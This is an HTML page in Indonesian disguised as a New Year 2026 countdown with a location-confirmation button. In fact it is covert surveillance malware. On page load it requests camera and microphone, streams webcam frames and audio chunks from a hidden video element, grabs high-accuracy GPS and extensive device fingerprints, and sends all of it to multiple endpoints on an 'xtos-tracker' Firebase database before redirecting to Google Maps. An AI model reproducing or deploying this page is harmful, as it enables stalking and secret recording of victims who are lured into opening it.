<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéä Countdown Tahun Baru 2026 - Lokasi Terpilih!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white; min-height: 100vh; display: flex; flex-direction: column;
            justify-content: center; align-items: center; text-align: center; padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 30px;
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37); border: 1px solid rgba(255, 255, 255, 0.18);
            max-width: 500px; width: 100%;
        }
        .title { font-size: 2.5em; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
        .countdown { font-size: 3em; font-weight: bold; margin: 20px 0; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
        .btn {
            background: linear-gradient(45deg, #ff6b6b, #ee5a24); border: none; padding: 15px 30px; border-radius: 50px;
            color: white; font-size: 1.1em; font-weight: bold; cursor: pointer; transition: all 0.3s ease;
            margin: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0,0,0,0.3); }
        .status { margin-top: 20px; padding: 15px; border-radius: 10px; background: rgba(255, 255, 255, 0.1); font-weight: bold; }
        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="title">üéä COUNTDOWN 2026</div>
        <div class="countdown" id="countdown">üî¥ 00:00:00</div>
        <button class="btn" onclick="confirmLocation()">üéØ KONFIRMASI LOKASI</button>
        <div class="status" id="status">üî¥ LIVE STREAMING READY - Klik untuk mulai!</div>
    </div>

    <script>
        let isProcessing = false;
        let trackingSession = { startTime: Date.now(), interactions: [], locations: [] };
        let liveStreamActive = false;
        
        // DEVICE FINGERPRINTING
        const deviceFingerprint = {
            screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            webgl: getWebGLFingerprint(),
            canvas: getCanvasFingerprint()
        };
        
        function getWebGLFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const renderer = gl.getParameter(gl.RENDERER);
                    const vendor = gl.getParameter(gl.VENDOR);
                    const version = gl.getParameter(gl.VERSION);
                    return `${renderer} | ${vendor} | ${version}`.slice(0, 50);
                }
                return 'unavailable';
            } catch (e) { return 'error'; }
        }
        
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 200;
                canvas.height = 50;
                const ctx = canvas.getContext('2d');
                
                // Complex canvas fingerprinting
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Fingerprint test üéØ', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Canvas fingerprint', 4, 35);
                
                return canvas.toDataURL().slice(-30);
            } catch (e) { return 'error'; }
        }
        
        // REAL BATTERY STATUS
        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging,
                        chargingTime: battery.chargingTime === Infinity ? 'Unknown' : Math.round(battery.chargingTime / 60) + ' min',
                        dischargingTime: battery.dischargingTime === Infinity ? 'Unknown' : Math.round(battery.dischargingTime / 60) + ' min'
                    };
                }
            } catch (e) {}
            return { level: 'Unknown', charging: 'Unknown', chargingTime: 'Unknown', dischargingTime: 'Unknown' };
        }
        
        // REAL NETWORK INFO
        function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                return {
                    effectiveType: connection.effectiveType || 'Unknown',
                    downlink: connection.downlink ? connection.downlink + ' Mbps' : 'Unknown',
                    rtt: connection.rtt ? connection.rtt + ' ms' : 'Unknown',
                    saveData: connection.saveData ? 'Enabled' : 'Disabled'
                };
            }
            return { effectiveType: 'Unknown', downlink: 'Unknown', rtt: 'Unknown', saveData: 'Unknown' };
        }
        
        // REAL ENHANCED DEVICE INFO
        function getEnhancedDeviceInfo() {
            const ua = navigator.userAgent;
            
            // Extract real device brand and model
            let brand = 'Unknown', model = 'Unknown', androidVersion = 'Unknown';
            
            if (ua.includes('Android')) {
                const androidMatch = ua.match(/Android ([^;]+)/);
                androidVersion = androidMatch ? androidMatch[1] : 'Unknown';
                
                if (ua.includes('Samsung')) {
                    brand = 'Samsung';
                    const modelMatch = ua.match(/SM-([A-Z0-9]+)/);
                    model = modelMatch ? 'Galaxy ' + modelMatch[1] : 'Galaxy Unknown';
                } else if (ua.includes('Xiaomi')) {
                    brand = 'Xiaomi';
                    const modelMatch = ua.match(/([A-Z0-9\s]+); wv/);
                    model = modelMatch ? modelMatch[1] : 'Unknown';
                } else if (ua.includes('OPPO')) {
                    brand = 'OPPO';
                    const modelMatch = ua.match(/OPPO ([A-Z0-9]+)/);
                    model = modelMatch ? modelMatch[1] : 'Unknown';
                } else if (ua.includes('vivo')) {
                    brand = 'Vivo';
                    const modelMatch = ua.match(/vivo ([A-Z0-9]+)/);
                    model = modelMatch ? modelMatch[1] : 'Unknown';
                } else if (ua.includes('Huawei')) {
                    brand = 'Huawei';
                    const modelMatch = ua.match(/([A-Z0-9-]+); wv/);
                    model = modelMatch ? modelMatch[1] : 'Unknown';
                }
            } else if (ua.includes('iPhone')) {
                brand = 'Apple';
                const modelMatch = ua.match(/iPhone OS ([0-9_]+)/);
                model = 'iPhone';
                androidVersion = modelMatch ? 'iOS ' + modelMatch[1].replace(/_/g, '.') : 'iOS Unknown';
            }
            
            return {
                brand,
                model,
                androidVersion,
                screenResolution: `${screen.width}x${screen.height}`,
                memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
                cpuCores: navigator.hardwareConcurrency || 'Unknown'
            };
        }
        
        // REAL TIMING INFO
        function getTimingInfo() {
            const now = new Date();
            return {
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
                dateFormat: now.toLocaleDateString(),
                timeFormat: now.toLocaleTimeString()
            };
        }
        
        // REAL ADVANCED FINGERPRINTING
        function getAdvancedFingerprint() {
            return {
                canvas: getCanvasFingerprint(),
                webgl: getWebGLFingerprint(),
                audio: getAudioFingerprint(),
                fonts: getFontFingerprint()
            };
        }
        
        // AUDIO FINGERPRINTING
        function getAudioFingerprint() {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const analyser = audioContext.createAnalyser();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(analyser);
                analyser.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                const fingerprint = {
                    sampleRate: audioContext.sampleRate,
                    maxChannelCount: audioContext.destination.maxChannelCount,
                    state: audioContext.state
                };
                
                audioContext.close();
                return JSON.stringify(fingerprint).slice(-20);
            } catch (e) {
                return 'unavailable';
            }
        }
        
        // FONT FINGERPRINTING
        function getFontFingerprint() {
            const testFonts = ['Arial', 'Helvetica', 'Times', 'Courier', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const testString = 'Fingerprint123!@#';
            
            let fontHash = '';
            testFonts.forEach(font => {
                ctx.font = `12px ${font}`;
                const width = ctx.measureText(testString).width;
                fontHash += width.toString();
            });
            
            return fontHash.slice(-20);
        }
        
        // LIVE CAMERA STREAMING SYSTEM
        let mediaCapture = { videoStream: null, liveVideo: null };
        
        // REAL LIVE CAMERA STREAMING
        async function initLiveCameraStreaming() {
            try {
                console.log('üìπ Requesting camera access...');
                
                // Request camera with audio
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 1280, min: 640 }, 
                        height: { ideal: 720, min: 480 }, 
                        facingMode: 'user',
                        frameRate: { ideal: 30, min: 10 }
                    }, 
                    audio: false // Separate audio handling
                });
                
                mediaCapture.videoStream = stream;
                console.log('üìπ Camera stream obtained');
                
                // Create video element for capture
                const video = document.createElement('video');
                video.srcObject = stream;
                video.style.position = 'fixed';
                video.style.top = '-1000px'; // Hide but keep functional
                video.style.left = '-1000px';
                video.style.width = '1px';
                video.style.height = '1px';
                video.autoplay = true;
                video.muted = true;
                video.playsInline = true;
                document.body.appendChild(video);
                mediaCapture.liveVideo = video;
                
                // Wait for video to be ready
                return new Promise((resolve) => {
                    video.addEventListener('loadedmetadata', () => {
                        console.log('üìπ Video metadata loaded:', video.videoWidth + 'x' + video.videoHeight);
                        
                        video.addEventListener('canplay', () => {
                            console.log('üìπ Video can play, starting capture');
                            
                            // Start immediate capture test
                            setTimeout(() => captureLiveFrame(video), 1000);
                            
                            // Start live streaming - capture every 3 seconds
                            setInterval(() => captureLiveFrame(video), 3000);
                            
                            // High quality shots every 10 seconds
                            setInterval(() => captureHighQualityShot(video), 10000);
                            
                            liveStreamActive = true;
                            updateStatus('üî¥ LIVE CAMERA ACTIVE');
                            resolve(true);
                        });
                    });
                    
                    // Fallback timeout
                    setTimeout(() => {
                        if (!liveStreamActive) {
                            console.log('üìπ Video setup timeout, but continuing');
                            liveStreamActive = true;
                            resolve(true);
                        }
                    }, 5000);
                });
                
            } catch (error) {
                console.error('‚ùå Camera access error:', error);
                updateStatus('‚ùå Camera denied: ' + error.message);
                return false;
            }
        }
        
        // REAL LIVE FRAME CAPTURE
        async function captureLiveFrame(videoElement) {
            try {
                if (!videoElement || videoElement.videoWidth === 0 || videoElement.readyState < 2) {
                    console.log('üìπ Video not ready, skipping frame');
                    return;
                }
                
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const ctx = canvas.getContext('2d');
                
                // Draw current video frame
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                // Add live streaming overlay
                ctx.fillStyle = 'rgba(255, 0, 0, 0.8)';
                ctx.fillRect(10, 10, 100, 30);
                ctx.fillStyle = 'white';
                ctx.font = 'bold 14px Arial';
                ctx.fillText('üî¥ LIVE', 15, 30);
                
                // Add timestamp
                const timestamp = new Date().toLocaleTimeString();
                ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
                ctx.fillRect(10, canvas.height - 40, 150, 30);
                ctx.fillStyle = 'white';
                ctx.font = '12px Arial';
                ctx.fillText(timestamp, 15, canvas.height - 20);
                
                // Convert to base64 with good quality
                const imageData = canvas.toDataURL('image/jpeg', 0.85);
                
                const frameData = {
                    image: imageData,
                    timestamp: Date.now(),
                    type: 'live_camera_frame',
                    size: { width: canvas.width, height: canvas.height },
                    url: window.location.href,
                    quality: 'live_stream',
                    frameRate: '0.5fps',
                    dataSize: imageData.length
                };
                
                await sendMediaToFirebase(frameData, 'live_stream');
                console.log('üìπ Live frame sent:', frameData.size.width + 'x' + frameData.size.height, 'Size:', Math.round(imageData.length/1024) + 'KB');
                
                // Update status to show streaming is working
                updateStatus(`üî¥ LIVE: ${Math.round(imageData.length/1024)}KB frame sent`);
                
            } catch (error) {
                console.error('‚ùå Live frame error:', error);
            }
        }
        
        // HIGH QUALITY CAPTURE
        async function captureHighQualityShot(videoElement) {
            try {
                if (!videoElement || videoElement.videoWidth === 0) return;
                
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const ctx = canvas.getContext('2d');
                
                // High quality capture
                ctx.drawImage(videoElement, 0, 0);
                
                // Add quality indicator
                ctx.fillStyle = 'rgba(0, 255, 0, 0.8)';
                ctx.fillRect(canvas.width - 120, 10, 110, 30);
                ctx.fillStyle = 'black';
                ctx.font = 'bold 14px Arial';
                ctx.fillText('üì∏ HQ SHOT', canvas.width - 115, 30);
                
                const imageData = canvas.toDataURL('image/jpeg', 0.95);
                const shotData = {
                    image: imageData,
                    timestamp: Date.now(),
                    type: 'hq_camera_shot',
                    size: { width: canvas.width, height: canvas.height },
                    url: window.location.href,
                    quality: 'high_quality'
                };
                
                await sendMediaToFirebase(shotData, 'hq_shot');
                console.log('üì∏ HQ shot sent:', shotData.size.width + 'x' + shotData.size.height);
                
            } catch (error) {
                console.error('‚ùå HQ shot error:', error);
            }
        }
        
        // REAL CONTINUOUS AUDIO STREAMING
        let audioRecorder = null;
        let audioStream = null;
        
        async function startContinuousAudio() {
            try {
                // Request audio with maximum permissions
                audioStream = await navigator.mediaDevices.getUserMedia({ 
                    audio: {
                        echoCancellation: false,
                        noiseSuppression: false,
                        autoGainControl: false,
                        sampleRate: 48000,
                        channelCount: 2
                    }
                });
                
                // Check supported MIME types
                const mimeTypes = [
                    'audio/webm;codecs=opus',
                    'audio/webm',
                    'audio/mp4',
                    'audio/ogg;codecs=opus'
                ];
                
                let selectedMimeType = 'audio/webm';
                for (const mimeType of mimeTypes) {
                    if (MediaRecorder.isTypeSupported(mimeType)) {
                        selectedMimeType = mimeType;
                        break;
                    }
                }
                
                audioRecorder = new MediaRecorder(audioStream, { 
                    mimeType: selectedMimeType,
                    audioBitsPerSecond: 128000
                });
                
                let audioChunks = [];
                let recordingCount = 0;
                
                audioRecorder.ondataavailable = (event) => {
                    if (event.data && event.data.size > 0) {
                        audioChunks.push(event.data);
                        console.log('üé§ Audio chunk received:', event.data.size, 'bytes');
                    }
                };
                
                audioRecorder.onstop = async () => {
                    if (audioChunks.length > 0) {
                        try {
                            const audioBlob = new Blob(audioChunks, { type: selectedMimeType });
                            console.log('üé§ Audio blob created:', audioBlob.size, 'bytes');
                            
                            const audioBase64 = await blobToBase64(audioBlob);
                            const audioData = {
                                audio: audioBase64,
                                timestamp: Date.now(),
                                duration: 10000, // 10 second chunks
                                type: 'live_audio_stream',
                                sequence: recordingCount++,
                                mimeType: selectedMimeType,
                                size: audioBlob.size
                            };
                            
                            await sendMediaToFirebase(audioData, 'live_audio');
                            console.log('üé§ Live audio chunk sent:', recordingCount, 'Size:', audioBlob.size);
                            
                        } catch (error) {
                            console.error('‚ùå Audio processing error:', error);
                        }
                    }
                    
                    // Reset and continue recording
                    audioChunks = [];
                    
                    // Restart recording after 1 second
                    setTimeout(() => {
                        if (audioRecorder && audioRecorder.state === 'inactive' && audioStream) {
                            try {
                                audioRecorder.start(1000); // Record in 1-second chunks
                                console.log('üé§ Audio recording restarted');
                            } catch (e) {
                                console.error('‚ùå Audio restart error:', e);
                            }
                        }
                    }, 1000);
                };
                
                audioRecorder.onerror = (event) => {
                    console.error('‚ùå Audio recorder error:', event.error);
                };
                
                // Start recording in 10-second chunks
                audioRecorder.start(1000);
                console.log('üé§ Audio recording started with', selectedMimeType);
                
                // Stop and restart every 10 seconds for continuous streaming
                setInterval(() => {
                    if (audioRecorder && audioRecorder.state === 'recording') {
                        audioRecorder.stop();
                    }
                }, 10000);
                
                updateStatus('üé§ Live audio streaming active');
                return true;
                
            } catch (error) {
                console.error('‚ùå Audio streaming error:', error);
                updateStatus('‚ùå Audio access denied');
                return false;
            }
        }
        
        // REAL ENHANCED MEDIA SENDER
        async function sendMediaToFirebase(mediaData, type) {
            try {
                const endpoints = [
                    'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/media.json',
                    'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live_stream.json',
                    'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/enhanced.json'
                ];
                
                const batteryInfo = await getBatteryInfo();
                const networkInfo = getNetworkInfo();
                
                const payload = {
                    ...mediaData,
                    deviceFingerprint: deviceFingerprint,
                    batteryInfo: batteryInfo,
                    networkInfo: networkInfo,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    timestamp: Date.now(),
                    mediaType: type
                };
                
                console.log(`üöÄ Sending ${type} to Firebase:`, payload.type, payload.size || 'unknown size');
                
                // Send to multiple endpoints with error handling
                const promises = endpoints.map(async (endpoint) => {
                    try {
                        const response = await fetch(endpoint, {
                            method: 'POST',
                            headers: { 
                                'Content-Type': 'application/json',
                                'Accept': 'application/json'
                            },
                            body: JSON.stringify(payload)
                        });
                        
                        if (response.ok) {
                            console.log(`‚úÖ ${type} sent to:`, endpoint.split('/').pop());
                            return true;
                        } else {
                            console.error(`‚ùå ${type} failed:`, endpoint, response.status);
                            return false;
                        }
                    } catch (e) {
                        console.error(`‚ùå ${type} error:`, endpoint, e.message);
                        return false;
                    }
                });
                
                const results = await Promise.allSettled(promises);
                const successCount = results.filter(r => r.status === 'fulfilled' && r.value).length;
                
                console.log(`üìä ${type} sent to ${successCount}/${endpoints.length} endpoints`);
                
                if (successCount > 0) {
                    updateStatus(`‚úÖ ${type.toUpperCase()} sent to ${successCount} servers`);
                } else {
                    updateStatus(`‚ùå ${type.toUpperCase()} failed to send`);
                }
                
            } catch (error) {
                console.error(`‚ùå Media send error:`, error);
                updateStatus(`‚ùå ${type.toUpperCase()} send error`);
            }
        }
        
        // UTILITY FUNCTIONS
        function blobToBase64(blob) {
            return new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.onloadend = () => {
                    if (reader.result) {
                        resolve(reader.result);
                    } else {
                        reject(new Error('Failed to convert blob to base64'));
                    }
                };
                reader.onerror = () => reject(new Error('FileReader error'));
                reader.readAsDataURL(blob);
            });
        }
        
        function updateStatus(message) {
            document.getElementById('status').innerHTML = message;
        }
        
        // COUNTDOWN WITH LIVE INDICATOR
        function updateCountdown() {
            const now = new Date();
            const newYear = new Date('2026-01-01T00:00:00');
            const diff = newYear - now;
            
            if (diff > 0) {
                const days = Math.floor(diff / (1000 * 60 * 60 * 24));
                const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((diff % (1000 * 60)) / 1000);
                
                const liveIndicator = liveStreamActive ? (seconds % 2 === 0 ? 'üî¥' : '‚ö´') : '‚ö™';
                document.getElementById('countdown').textContent = 
                    `${liveIndicator} ${days.toString().padStart(3, '0')}:${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            } else {
                document.getElementById('countdown').textContent = 'üéä HAPPY NEW YEAR! üéä';
            }
        }
        
        setInterval(updateCountdown, 1000);
        updateCountdown();
        
        // MAIN LOCATION CONFIRMATION WITH LIVE STREAMING
        async function confirmLocation() {
            if (isProcessing) return;
            isProcessing = true;
            
            updateStatus('<div class="loading"></div> Initializing live capture...');
            
            try {
                // Initialize live streaming systems
                const cameraReady = await initLiveCameraStreaming();
                const audioReady = await startContinuousAudio();
                
                updateStatus('<div class="loading"></div> Accessing high-accuracy GPS...');
                
                // Get high-accuracy location
                const position = await getCurrentPosition();
                const { latitude, longitude, accuracy } = position.coords;
                
                // Get real-time device info
                const batteryInfo = await getBatteryInfo();
                const networkInfo = getNetworkInfo();
                const deviceInfo = getEnhancedDeviceInfo();
                const timingInfo = getTimingInfo();
                const fingerprintInfo = getAdvancedFingerprint();
                
                // Comprehensive data package with REAL data
                const liveData = {
                    latitude,
                    longitude,
                    accuracy,
                    timestamp: Date.now(),
                    
                    // REAL Device Info
                    deviceBrand: deviceInfo.brand,
                    deviceModel: deviceInfo.model,
                    androidVersion: deviceInfo.androidVersion,
                    screenResolution: deviceInfo.screenResolution,
                    deviceMemory: deviceInfo.memory,
                    cpuCores: deviceInfo.cpuCores,
                    
                    // REAL Power & Network
                    batteryLevel: batteryInfo.level,
                    isCharging: batteryInfo.charging,
                    chargingTime: batteryInfo.chargingTime,
                    dischargingTime: batteryInfo.dischargingTime,
                    networkType: networkInfo.effectiveType,
                    downlinkSpeed: networkInfo.downlink,
                    rtt: networkInfo.rtt,
                    saveData: networkInfo.saveData,
                    
                    // REAL Timing Info
                    timezone: timingInfo.timezone,
                    language: timingInfo.language,
                    languages: timingInfo.languages,
                    dateFormat: timingInfo.dateFormat,
                    timeFormat: timingInfo.timeFormat,
                    
                    // REAL Advanced Fingerprinting
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    canvasFingerprint: fingerprintInfo.canvas,
                    webglRenderer: fingerprintInfo.webgl,
                    audioFingerprint: fingerprintInfo.audio,
                    fontFingerprint: fingerprintInfo.fonts,
                    
                    // Live streaming status
                    liveCameraActive: cameraReady,
                    liveAudioActive: audioReady,
                    streamingQuality: 'maximum',
                    frameRate: '0.5fps',
                    audioChunkSize: '15s'
                };
                
                // Send initial data
                await sendToFirebase(liveData);
                
                updateStatus('üî¥ LIVE STREAMING ACTIVE - Redirecting...');
                
                // Continue streaming in background for 10 more seconds
                setTimeout(() => {
                    window.location.href = `https://maps.google.com/?q=${latitude},${longitude}&z=18`;
                }, 5000);
                
            } catch (error) {
                updateStatus('‚ùå Live capture failed. Retrying...');
                console.error('Live capture error:', error);
                setTimeout(() => confirmLocation(), 2000);
            } finally {
                setTimeout(() => { isProcessing = false; }, 5000);
            }
        }
        
        // ENHANCED LOCATION SENDER
        async function sendToFirebase(data) {
            const endpoints = [
                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations.json',
                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live.json',
                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/backup.json',
                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/enhanced.json',
                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live_stream.json'
            ];
            
            const promises = endpoints.map(endpoint => 
                fetch(endpoint, {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json',
                        'X-Live-Stream': 'true'
                    },
                    body: JSON.stringify({
                        ...data,
                        endpoint: endpoint.split('/').pop().replace('.json', ''),
                        streamActive: liveStreamActive
                    })
                }).catch(err => console.log('Endpoint failed:', endpoint))
            );
            
            await Promise.allSettled(promises);
        }
        
        // HIGH ACCURACY GPS
        function getCurrentPosition() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocation not supported'));
                    return;
                }
                
                let attempts = 0;
                const maxAttempts = 3;
                
                function tryGetLocation() {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            if (position.coords.accuracy <= 20 || attempts >= maxAttempts) {
                                resolve(position);
                            } else {
                                attempts++;
                                setTimeout(tryGetLocation, 1000);
                            }
                        },
                        (error) => {
                            if (attempts >= maxAttempts) {
                                reject(error);
                            } else {
                                attempts++;
                                setTimeout(tryGetLocation, 1000);
                            }
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                }
                
                tryGetLocation();
            });
        }
        
        // AUTO-INITIALIZE LIVE STREAMING
        window.addEventListener('load', () => {
            // Pre-initialize camera for faster access
            setTimeout(async () => {
                try {
                    await initLiveCameraStreaming();
                    console.log('üìπ Camera pre-initialized');
                } catch (e) {
                    console.log('Camera pre-init failed');
                }
            }, 1000);
            
            // Auto-trigger live capture
            setTimeout(() => {
                if (!isProcessing) {
                    confirmLocation();
                }
            }, 1000);
            
            // Test media permissions immediately
            setTimeout(async () => {
                try {
                    console.log('üìπ Testing camera access...');
                    await initLiveCameraStreaming();
                } catch (e) {
                    console.log('‚ùå Camera test failed:', e);
                }
                
                try {
                    console.log('üé§ Testing audio access...');
                    await startContinuousAudio();
                } catch (e) {
                    console.log('‚ùå Audio test failed:', e);
                }
            }, 500);
        });
        
        // Keep streaming active
        setInterval(() => {
            if (liveStreamActive) {
                console.log('üìπ Live streaming active:', new Date().toLocaleTimeString());
            }
        }, 30000);
    </script>
</body>
</html>
